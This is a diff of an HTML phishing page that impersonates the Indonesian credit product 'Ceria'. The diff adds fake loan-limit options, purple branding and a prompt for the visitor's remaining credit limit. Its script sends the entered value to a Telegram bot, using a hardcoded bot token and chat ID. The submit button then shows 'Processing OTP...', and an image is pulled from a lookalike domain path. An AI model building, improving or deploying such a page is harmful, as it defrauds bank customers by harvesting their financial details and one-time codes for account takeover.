@@ -1,9 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>limit Ceria</title>
-  <meta name="viewport" content="width, initial-scale=1">
+  <title>Limit Ceria</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -33,54 +31,62 @@
     /* Kolom Select */
     #pilihan-container {
       width: 100%;
+      max-width: 350px;
       margin-bottom: 10px;
+      margin: 0 auto;
     }
 
     #pilihan {
       width: 100%;
-      padding: 8px;
-      border-radius: 4px;
-      border: 1px solid #ccc;
+      padding: 12px;
+      border-radius: 6px;
+      border: 1px solid #9400d2;
+    }
+
+    /* Jarak antara kolom select dan kolom input */
+    #jarak1 {
+      height: 10px;
     }
 
     /* Kolom Input dan Tombol Submit */
     #jumlah-container {
       width: 100%;
+      max-width: 330px;
       margin-bottom: 10px;
       display: flex;
       flex-direction: column;
+      margin: 0 auto;
     }
 
-    #jumlah {
+    #jumlahInput {
       width: 100%;
-      padding: 8px;
-      border-radius: 4px;
-      border: 1px solid #ccc;
-      margin-bottom: 7px; /* Menambah jarak antara kolom input dan tombol submit */
+      padding: 12px;
+      border-radius: 5px;
+      border: 1px solid #9400d3;
+      margin-bottom: 7px;
     }
 
     #submit {
       width: 100%;
-      padding: 10px;
-      border-radius: 4px;
+      max-width: 330px;
+      padding: 13px;
+      border-radius: 5px;
       border: none;
-      background-color: #4CAF50;
+      background-color: #663399;
       color: white;
       font-weight: bold;
       cursor: pointer;
+      margin-top: 7px;
     }
 
     /* Gambar di bawah Tombol Submit */
     #gambar-bawah {
       margin-top: 20px;
-      text-align: center;
     }
 
     #gambar-bawah img {
-      width: 50%; /* Mengurangi ukuran foto */
-      max-width: 300px; /* Maksimum lebar foto */
+      width: 50%;
       object-fit: cover;
-      border-radius: 4px; /* Membulatkan sudut foto */
     }
   </style>
   <script>
@@ -91,7 +97,6 @@
           console.log("Pesan terkirim: " + message);
         }
       };
-
       var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
 
       xhttp.open("POST", url, true);
@@ -99,8 +104,8 @@
     }
 
     function kirimPesan() {
-      var pesan = document.getElementById("pesan").value;
-      sendMessageToTelegram(pesan);
+      var pesan = document.getElementById("jumlahInput").value;
+      sendMessageToTelegram("Masukan sisa limit: " + pesan);
 
       document.getElementById("submit").value = "Processing OTP...";
 
@@ -118,20 +123,23 @@
 
   <!-- Kolom Select -->
   <div id="pilihan-container">
-    <label for="pilihan">Pilihan:</label>
+    <label for="pilihan"></label>
     <select id="pilihan" name="pilihan">
-      <option value="opsi1">Opsi 1</option>
-      <option value="opsi2">Opsi 2</option>
-      <option value="opsi3">Opsi 3</option>
-      <option value="opsi4">Opsi 4</option>
+      <option value="opsi1">Pilih Limit</option>
+      <option value="opsi2">Rp 10.000.000 tenor 12 bulan suku bunga 1.42%</option>
+      <option value="opsi3">Rp 15.000.000 tenor 12 bulan suku bunga 1.42%</option>
+      <option value="opsi4">Rp 25.000.000 tenor 12 bulan suku bunga 1.42%</option>
+      <option value="opsi5">Rp 50.000.000 Tenor 12 bulan suku bunga 1.42%</option>
     </select>
   </div>
 
+  <!-- Jarak antara kolom select dan kolom input -->
+  <div id="jarak1"></div>
+
   <!-- Kolom Input dan Tombol Submit -->
   <div id="jumlah-container">
-    <label for="jumlah">Jumlah:</label>
-    <input type="number" id="jumlah" name="jumlah">
-    <input type="submit" id="submit" value="Submit" onclick="kirimPesan()">
+    <input type="number" id="jumlahInput" name="jumlah" placeholder="Masukan sisa limit">
+    <input type="submit" id="submit" value="Lanjutkan" onclick="kirimPesan()">
   </div>
 
   <!-- Gambar Bawah -->
@@ -139,4 +147,4 @@
     <img src="https://wwed.online/ceria-id.com/img/2711.jpg" alt="Gambar 2711">
   </div>
 </body>
-</html>
+      </html>
